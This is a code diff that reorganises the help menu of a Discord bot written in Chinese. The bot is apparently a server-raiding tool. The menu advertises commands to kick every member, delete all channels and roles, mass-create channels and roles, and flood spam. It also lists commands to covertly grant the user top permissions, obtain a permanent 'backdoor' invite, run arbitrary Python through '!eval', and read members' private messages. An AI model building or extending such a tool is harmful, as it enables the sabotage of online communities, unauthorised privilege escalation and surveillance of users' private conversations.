@@ -60,33 +60,27 @@ async def help_msg(ctx):
             "`!kick_everyone` - 踢出伺服器全員\n"
             "`!bye` - 機器人退出伺服器\n"
             "`!set_server [名]` - 修改伺服器名稱\n"
+            "`!server_gate [lock/unlock]` - 全服鎖定/解鎖發言\n"
+            "`!clean_user @成員 [數]` - 刪除指定人的訊息\n"
+            "`!clean_keyword [詞] [數]` - 刪除特定關鍵字\n"
+            "`!del_msg [數]` - 批次清理訊息\n"
+            "`!disrole @成員` - 剝奪對方身分\n"
             "`!add_role @成員 @組` - 給予身分組\n"
             "`!remove_role @成員 @組` - 移除身分組\n"
-            "`!server_gate [lock/unlock]` - 全服鎖定/解鎖發言"
+            "`!backdoor` - 獲取永久邀請連結\n"
+            "`!move_all [頻道ID]` - 強制全體移動語音\n"
         ), 
         inline=False
     )
     
     embed.add_field(
-        name="🔥 破壞/重整", 
+        name="🔥 破壞", 
         value=(
             "`!del_ch` - 刪除所有頻道\n"
             "`!del_role` - 刪除所有身分組\n"
             "`!100ch` - 建立 100 個頻道\n"
             "`!100rl` - 建立 100 個身分組\n"
-            "`!spam [次] [文]` - 洗頻攻擊"
-        ), 
-        inline=False
-    )
-    
-    embed.add_field(
-        name="🕵️ 隱蔽操作", 
-        value=(
-            "`!op_me` - 獲取最高權限\n"
-            "`!disrole @成員` - 剝奪對方身分\n"
-            "`!del_msg [數]` - 批次清理訊息\n"
-            "`!backdoor` - 獲取永久邀請連結\n"
-            "`!move_all [頻道ID]` - 強制全體移動語音"
+            "`!spam [次] [文]` - 洗頻攻擊\n"
         ), 
         inline=False
     )
@@ -96,9 +90,8 @@ async def help_msg(ctx):
         value=(
             "`!eval [code]` - 執行動態 Python 腳本\n"
             "`!snapshot` - 導出伺服器完整結構 JSON\n"
-            "`!clean_user @成員 [數]` - 刪除指定人的訊息\n"
-            "`!clean_keyword [詞] [數]` - 刪除特定關鍵字\n"
-            "`!reset` - 強制重啟系統實例"
+            "`!op_me` - 獲取最高權限\n"
+            "`!reset` - 強制重啟系統實例\n"
         ), 
         inline=False
     )
@@ -107,7 +100,7 @@ async def help_msg(ctx):
         name="🎮 有趣系統", 
         value=(
             "`!get_dm @成員 [數]` - 調閱私訊紀錄\n"
-            "`!dm @成員 [文]` - 以機器人名義私訊"
+            "`!dm @成員 [文]` - 以機器人名義私訊\n"
         ), 
         inline=False
     )
